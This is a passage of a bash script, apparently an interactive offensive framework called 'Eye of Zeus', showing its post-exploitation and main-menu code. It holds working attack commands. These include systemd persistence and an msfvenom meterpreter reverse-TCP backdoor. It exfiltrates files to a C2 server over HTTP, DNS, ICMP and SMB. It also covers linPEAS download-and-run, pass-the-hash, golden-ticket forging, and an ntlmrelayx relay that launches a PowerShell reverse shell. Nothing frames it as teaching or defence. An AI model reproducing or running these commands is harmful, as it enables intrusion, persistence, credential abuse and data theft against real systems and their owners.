                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter service name:${RESET}"
                    read -r service_name
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter command to run:${RESET}"
                    read -r command
                    echo "[Unit]
Description=$service_name
After=network.target

[Service]
ExecStart=$command
Restart=always

[Install]
WantedBy=multi-user.target" > "/etc/systemd/system/$service_name.service"
                    systemctl enable "$service_name"
                    systemctl start "$service_name"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Systemd service $service_name created${RESET}"
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener IP:${RESET}"
                    read -r lhost
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener port:${RESET}"
                    read -r lport
                    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > "/tmp/backdoor"
                    chmod +x "/tmp/backdoor"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Backdoor created at /tmp/backdoor${RESET}"
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        2)
            banner
            modern_header "DATA EXFILTRATION"
            echo -e "${HYPR_CYAN}${BOLD}1) HTTP${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) DNS${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) ICMP${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) SMB${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r exfil_choice

            case $exfil_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter C2 server URL:${RESET}"
                    read -r url
                    curl -F "file=@$file" "$url"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain for exfiltration:${RESET}"
                    read -r domain
                    for line in $(xxd -p -c 16 "$file"); do
                        dig "$line.$domain" +short
                    done
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter C2 server IP:${RESET}"
                    read -r ip
                    for line in $(xxd -p -c 16 "$file"); do
                        ping -c 1 -p "$line" "$ip"
                    done
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter SMB share (e.g., \\\\192.168.1.100\\share):${RESET}"
                    read -r share
                    smbclient "$share" -c "put $file"
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        3)
            banner
            modern_header "PRIVILEGE ESCALATION"
            echo -e "${HYPR_CYAN}${BOLD}1) Linux${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Windows${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r priv_choice

            case $priv_choice in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Running Linux privilege escalation checks...${RESET}"
                    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -O /tmp/linpeas.sh
                    chmod +x /tmp/linpeas.sh
                    /tmp/linpeas.sh
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Running Windows privilege escalation checks...${RESET}"
                    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEASx64.exe -O /tmp/winpeas.exe
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Download winPEAS to target and run it${RESET}"
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        4)
            banner
            modern_header "LATERAL MOVEMENT"
            echo -e "${HYPR_CYAN}${BOLD}1) Pass-the-Hash${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Golden Ticket${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) SMB Relay${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}4) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r lateral_choice

            case $lateral_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
                    read -r target
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter NTLM hash:${RESET}"
                    read -r hash
                    pth-winexe -U "$user"%"$hash" //"$target" cmd.exe
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain:${RESET}"
                    read -r domain
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain SID:${RESET}"
                    read -r sid
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter KRBTGT hash:${RESET}"
                    read -r krb_hash
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    ticketer.py -nthash "$krb_hash" -domain-sid "$sid" -domain "$domain" "$user"
                    export KRB5CCNAME="$user.ccache"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Golden ticket created for $user@$domain${RESET}"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
                    read -r target
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener IP:${RESET}"
                    read -r lhost
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener port:${RESET}"
                    read -r lport
                    echo "$target" > /tmp/eoz_targets.txt
                    impacket-ntlmrelayx -tf /tmp/eoz_targets.txt -smb2support -c "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};"
                    ;;
                4)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        5)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Main menu
main_menu() {
    while true; do
        banner
        modern_header "MAIN MENU"
        menu_item 1 "Network Discovery"
        menu_item 2 "MITM Attacks"
        menu_item 3 "Exploitation"
        menu_item 4 "Post-Exploitation"
        menu_item 5 "Exit" "$DEBIAN_RED"
        echo -ne "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
        read -r choice

        case $choice in
            1)
                network_discovery
                ;;
            2)
                mitm_attacks
                ;;
            3)
                exploitation
                ;;
            4)
                post_exploitation
                ;;
            5)
                echo -e "${DEBIAN_GREEN}${BOLD}[✓] Exiting Eye of Zeus... Stay stealthy!${RESET}"
                exit 0
                ;;
            *)
                echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                sleep 1
                ;;
        esac
    done
}

# Main function
main() {
    check_root
    banner
    type_text ">> Booting Eye of Zeus attack framework..." "$HYPR_MAGENTA" 0.01
    loading_bar "Initializing modules" 24 0.015
    check_dependencies
    type_text ">> Ready. Launching console..." "$DEBIAN_GREEN" 0.01
    sleep 0.4
    main_menu
}

main